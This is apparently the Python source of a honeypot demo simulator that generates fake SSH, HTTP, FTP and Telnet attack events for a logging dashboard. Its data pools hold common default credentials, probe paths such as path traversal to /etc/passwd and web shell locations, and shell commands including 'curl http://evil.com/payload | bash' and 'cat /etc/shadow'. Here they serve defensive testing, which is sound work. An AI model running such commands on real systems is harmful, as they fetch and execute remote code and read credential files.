"""
demo/simulator.py
=================
Generates realistic fake attack traffic for testing.

Events are pushed through the same EventLogger pipeline, so
the dashboard and log file work identically in demo mode.
"""

from __future__ import annotations

import random
import threading
import time
from collections.abc import Callable

from models import HoneypotEvent

# ---------------------------------------------------------------------------
# Realistic data pools
# ---------------------------------------------------------------------------

_USERNAMES = [
    "root", "admin", "ubuntu", "pi", "test", "oracle", "postgres",
    "guest", "ftpuser", "www-data", "mysql", "user", "support",
    "deploy", "ansible", "vagrant", "ec2-user", "centos", "git",
    "jenkins", "nagios", "backup", "operator", "service",
]

_PASSWORDS = [
    "123456", "password", "admin", "root", "toor", "12345678",
    "qwerty", "letmein", "welcome", "monkey", "dragon", "master",
    "login", "abc123", "passw0rd", "1234", "test", "guest",
    "shadow", "P@ssw0rd", "changeme", "default", "admin123",
    "password1", "iloveyou", "trustno1", "batman", "access",
]

# Persistent attackers + random scanners
_SOURCE_IPS = [
    # "Persistent" attackers (higher probability)
    "185.220.101.42", "45.141.84.12", "193.42.33.100",
    # Occasional scanners
    "103.25.17.88", "91.240.118.50", "194.26.29.15",
    "178.128.42.199", "167.99.200.31", "64.225.80.5",
    "159.65.144.3", "206.189.25.100", "142.93.167.88",
    # Internal lab IPs
    "10.10.10.100", "10.10.10.105", "192.168.1.50",
]

_HTTP_PATHS = [
    "/", "/wp-login.php", "/wp-admin", "/admin", "/phpmyadmin",
    "/phpMyAdmin", "/.env", "/api/v1/users", "/config.php",
    "/../../../etc/passwd", "/shell.php", "/wp-content/uploads/shell.php",
    "/robots.txt", "/sitemap.xml", "/.git/config", "/backup.sql",
    "/admin/login", "/api/v1/auth/token", "/server-status",
    "/cgi-bin/test.cgi", "/.htaccess", "/wp-json/wp/v2/users",
]

_HTTP_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "python-requests/2.31.0",
    "curl/8.4.0",
    "Nikto/2.1.6",
    "sqlmap/1.7.12",
    "Wget/1.21.4",
    "masscan/1.3.2",
    "Go-http-client/2.0",
]

_FTP_COMMANDS = ["USER", "PASS", "LIST", "RETR backup.tar.gz", "CWD /data", "QUIT"]

_TELNET_COMMANDS = [
    "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la",
    "ifconfig", "ps aux", "w", "cat /etc/shadow", "wget http://evil.com/shell.sh",
    "curl http://evil.com/payload | bash", "history", "crontab -l",
]


class AttackSimulator:
    """Generate realistic fake attack traffic for demo/testing."""

    def __init__(
        self,
        event_callback: Callable[[HoneypotEvent], None],
        rate: float = 2.0,
    ) -> None:
        self._emit = event_callback
        self._rate = rate
        self._session_counter = 0

    def run(self, duration: int = 60, stop: threading.Event | None = None) -> None:
        """Generate events for *duration* seconds at the configured rate."""
        stop = stop or threading.Event()
        interval = 1.0 / self._rate if self._rate > 0 else 1.0
        end_time = time.time() + duration

        generators = [
            self._ssh_brute_force,
            self._http_probe,
            self._ftp_attempt,
            self._telnet_login,
        ]
        weights = [0.35, 0.25, 0.20, 0.20]

        while not stop.is_set() and time.time() < end_time:
            random.choices(generators, weights)[0]()

            # Jitter around the target rate
            jitter = interval * random.uniform(0.5, 1.5)
            stop.wait(timeout=jitter)

    def _next_session(self) -> str:
        self._session_counter += 1
        return f"demo_{self._session_counter:04d}"

    def _pick_ip(self) -> str:
        # Weighted: persistent attackers appear more often
        if random.random() < 0.5:
            return random.choice(_SOURCE_IPS[:3])  # persistent
        return random.choice(_SOURCE_IPS)

    # ---- generators -------------------------------------------------------

    def _ssh_brute_force(self) -> None:
        """Simulate an SSH brute-force attempt."""
        ip = self._pick_ip()
        port = random.randint(40000, 65000)
        session_id = self._next_session()

        self._emit(HoneypotEvent(
            protocol="ssh", src_ip=ip, src_port=port, dst_port=2222,
            event_type="connection", session_id=session_id,
            metadata={"client_version": "SSH-2.0-libssh2_1.10.0"},
        ))

        # 1-3 credential attempts per session
        for _ in range(random.randint(1, 3)):
            self._emit(HoneypotEvent(
                protocol="ssh", src_ip=ip, src_port=port, dst_port=2222,
                event_type="credential_attempt",
                credentials={
                    "username": random.choice(_USERNAMES),
                    "password": random.choice(_PASSWORDS),
                },
                session_id=session_id,
                metadata={"auth_method": "password"},
            ))

        # Sometimes the attacker gets a shell
        if random.random() < 0.3:
            for cmd in random.sample(_TELNET_COMMANDS, k=random.randint(1, 4)):
                self._emit(HoneypotEvent(
                    protocol="ssh", src_ip=ip, src_port=port, dst_port=2222,
                    event_type="command", payload=cmd, session_id=session_id,
                ))

        self._emit(HoneypotEvent(
            protocol="ssh", src_ip=ip, src_port=port, dst_port=2222,
            event_type="disconnect", session_id=session_id,
        ))

    def _http_probe(self) -> None:
        """Simulate HTTP scanning / exploitation attempts."""
        ip = self._pick_ip()
        port = random.randint(40000, 65000)
        session_id = self._next_session()
        path = random.choice(_HTTP_PATHS)
        method = "POST" if path == "/wp-login.php" and random.random() < 0.6 else "GET"

        metadata = {
            "method": method,
            "path": path,
            "user_agent": random.choice(_HTTP_USER_AGENTS),
        }

        self._emit(HoneypotEvent(
            protocol="http", src_ip=ip, src_port=port, dst_port=8080,
            event_type="request", payload=f"{method} {path}",
            metadata=metadata, session_id=session_id,
        ))

        if method == "POST" and path == "/wp-login.php":
            self._emit(HoneypotEvent(
                protocol="http", src_ip=ip, src_port=port, dst_port=8080,
                event_type="credential_attempt",
                credentials={
                    "username": random.choice(_USERNAMES[:5]),
                    "password": random.choice(_PASSWORDS),
                },
                session_id=session_id,
                metadata={"form": "wp-login"},
            ))

    def _ftp_attempt(self) -> None:
        """Simulate FTP login and browsing attempts."""
        ip = self._pick_ip()
        port = random.randint(40000, 65000)
        session_id = self._next_session()

        self._emit(HoneypotEvent(
            protocol="ftp", src_ip=ip, src_port=port, dst_port=2121,
            event_type="connection", session_id=session_id,
        ))

        username = random.choice(_USERNAMES)
        password = random.choice(_PASSWORDS)
        self._emit(HoneypotEvent(
            protocol="ftp", src_ip=ip, src_port=port, dst_port=2121,
            event_type="credential_attempt",
            credentials={"username": username, "password": password},
            session_id=session_id,
        ))

        # Some attackers issue commands after login
        if random.random() < 0.5:
            cmds = random.sample(_FTP_COMMANDS[2:], k=random.randint(1, 3))
            for cmd in cmds:
                self._emit(HoneypotEvent(
                    protocol="ftp", src_ip=ip, src_port=port, dst_port=2121,
                    event_type="command", payload=cmd, session_id=session_id,
                ))

        self._emit(HoneypotEvent(
            protocol="ftp", src_ip=ip, src_port=port, dst_port=2121,
            event_type="disconnect", session_id=session_id,
        ))

    def _telnet_login(self) -> None:
        """Simulate Telnet brute-force and post-login activity."""
        ip = self._pick_ip()
        port = random.randint(40000, 65000)
        session_id = self._next_session()

        self._emit(HoneypotEvent(
            protocol="telnet", src_ip=ip, src_port=port, dst_port=2323,
            event_type="connection", session_id=session_id,
        ))

        self._emit(HoneypotEvent(
            protocol="telnet", src_ip=ip, src_port=port, dst_port=2323,
            event_type="credential_attempt",
            credentials={
                "username": random.choice(_USERNAMES),
                "password": random.choice(_PASSWORDS),
            },
            session_id=session_id,
        ))

        if random.random() < 0.4:
            for cmd in random.sample(_TELNET_COMMANDS, k=random.randint(1, 5)):
                self._emit(HoneypotEvent(
                    protocol="telnet", src_ip=ip, src_port=port, dst_port=2323,
                    event_type="command", payload=cmd, session_id=session_id,
                ))

        self._emit(HoneypotEvent(
            protocol="telnet", src_ip=ip, src_port=port, dst_port=2323,
            event_type="disconnect", session_id=session_id,
        ))
